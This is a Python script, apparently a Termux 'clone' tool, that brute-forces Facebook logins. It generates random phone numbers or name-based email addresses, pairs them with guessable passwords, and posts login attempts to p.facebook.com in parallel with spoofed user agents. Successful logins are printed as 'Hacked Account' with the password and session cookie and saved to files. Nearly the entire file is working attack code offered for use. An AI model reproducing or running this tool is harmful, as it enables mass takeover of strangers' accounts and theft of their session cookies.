#Sc Make By PAPI KUMAR 
#Gift By PAPI
#Github= PAPI-X

#_______Mudels______#
import os,sys,time,json,random,re,string,platform,base64,uuid,marshal
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#_______Coluar________#
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#_______TimeDate_______#
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#_________Proxy________#
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['7','8','9','10','11','12','13','14','15','16','17','21','35'])
    c=' RMX3478 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,114)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,100)
    h='Mobile Safari/537.36'
    ua=(f'{a} {b}; {c}{d}.{e}.{f}).{g} {h}')
    ugen.append(ua)   
#________Logo__________#
logo = ("""
\x1b[1;36m __  __ _____    _____        _____ _____ 
\033[1;96m|  \/  |  __ \  |  __ \ /\   |  __ \_   _|
\x1b[1;97m| \  / | |__) | | |__) /  \  | |__) || |  
\x1b[1;91m| |\/| |  _  /  |  ___/ /\ \ |  ___/ | |  
\033[1;31m| |  | | | \ \ _| |  / ____ \| |    _| |_ 
\x1b[1;93m|_|  |_|_|  \_(_)_| /_/    \_\_|   |_____|
         
\033[1;93m×××××××××××××××××\033[1;93mPAPI_T3RMUX_WORLD\033[1;93m×××××××××××××××××
\033[1;93m\033[1;32m[🍁] FACEBOK      : \033[1;34m ANAK KUMAR       \033[1;93m
\033[1;93m\033[1;35m[🍁] GITHUB       :  \033[1;34mPAPI-X            \033[1;93m
\033[1;93m\033[1;36m[🍁] TOOL STATUS  : \033[1;36m FREE\033[1;93m
\033[1;93m\033[1;36m[🍁] TOOL VIRSION :  \033[1;36m0.3              \033[1;93m
\033[1;92m\033[1;91m[🍁] GROUP        \x1b[1;92m:\x1b[1;92mPAPI TERMUX WORLD
\033[1;93m××××××××××××××××\033[1;93mPAPI_T3RMUX_WORLD\033[1;93m×××××××××××××××××""")
#__________Sc Main_________#
class Ifty:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(" [1] Random Number Clone")
        print(" [2] Random Gmail Clone ")
        print(" [3] Contact Admin")
        print(" [0] Exit")
        PAPI =input(" [?] Choose : ")
        if PAPI in ["1", "01"]:
            asha()
        if PAPI in ["2","02"]:
            naima()
        if PAPI in [" 3", "03"]:
           os.system('xdg-open https://www.facebook.com/profile.php?id=100083094259955')
        if PAPI in [" 0", "00"]:
            exit()
        else:
            exit()
            
#_________Numbar Clone_______#
def asha():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 017, 018, 019, 016, 014 ')
    kode = input(' [?] Choice Sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    limit = int(input(' [?] Clone Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as raifa:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] Total id:\033[1;92m '+tl)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SOME ID,Z LOCKED')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY PAPI - JOIN MY GROUP ')
        print('[!] Use flight mode for speed up ')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            raifa.submit(sabina,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')

#________Gamil Clone_______#
def naima():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [?] Target fast name : ')
    os.system('clear')
    print(logo)
    kodex = input(' [?] Target last name :  ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
    doamin = input(' [?] Terget doamin : ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    limit = int(input('[?] Clone Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as raifa:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] Total ids:\033[1;92m '+tl)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SOME ID,Z LOCKED')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY PAPI - JOIN MY GROUP ')
        print('[!] Use flight mode for speed up ')
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            raifa.submit(sabina,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')
def sabina(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write(f'\r\033[m[PAPI] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #__________Mathoid_______#
            header_freefb ={'authority': 'p.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '2.700000047683716',
            'referer': 'https://p.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Infinix X6812"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro, 
            'viewport-width': '980',}
            lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                #_______Ok Id Print________#
                print('\n\033[1;94m_____________Hacked Account______________\033[1;92m')
                print(f"\033[1;92m[NUMBAR] =  {uid}")
         #     print(f"\033[1;92m[UID] = {cid}")
                print(f"\033[1;92m[PASSWORD] = {ps}")
                print(f"\033[1;92m[COOKIE] = {coki}")
                open('/sdcard/PAPI-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #_________Cp Id Print________#
                print('\n\033[1;91m_____________Sorry Cp Account______________\033[1;95m')
                print(f"\033[1;95m[NUMBAR] =  {uid}")
                #print(f"[UID] = {ids}")
                print(f"\033[1;95m[PASSWORD] = {ps}")
            #  print(f'\033[1;95m[USAR AGENT] = '+pro+'\033[1;93m')
                open('/sdcard/PAPI-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[PAPI] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Ifty()
#closed#